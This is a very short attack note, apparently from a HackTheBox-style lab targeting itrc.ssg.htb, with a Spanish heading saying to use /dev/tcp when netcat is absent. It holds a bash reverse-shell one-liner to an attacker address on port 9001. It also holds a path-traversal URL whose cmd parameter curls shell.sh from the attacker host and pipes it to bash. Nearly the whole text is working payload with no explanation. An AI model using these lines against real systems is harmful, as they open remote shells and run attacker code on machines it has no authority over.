##Cuando no existe NC pero si linux, entonces usar /dev/tcp.



#!/bin/bash 

/bin/bash -c bash -i >& /dev/tcp/10.10.x.x/9001 0>&1


http://itrc.ssg.htb/index.php?page=../../../../../../../../tmp/lonewolf&cmd=curl+10.10.x.x:8000/shell.sh|bash
